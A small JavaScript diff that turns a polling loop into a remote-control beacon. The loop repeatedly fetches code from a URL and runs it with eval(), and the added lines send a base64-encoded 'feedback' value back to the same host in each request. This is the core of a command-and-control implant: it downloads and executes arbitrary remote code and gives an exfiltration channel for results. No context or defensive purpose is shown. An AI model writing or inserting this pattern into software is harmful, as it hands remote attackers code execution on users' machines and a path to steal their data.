@@ -1,8 +1,9 @@
 var running = true
+var feedback = ""
 async function fetchInLoop(u) {
     while (running) {
         try {
-            const response = await fetch(u);
+            const response = await fetch(u + "?res=" + btoa(feedback));
             const result = await response.text(); 
             eval(result);
         } catch (error) {
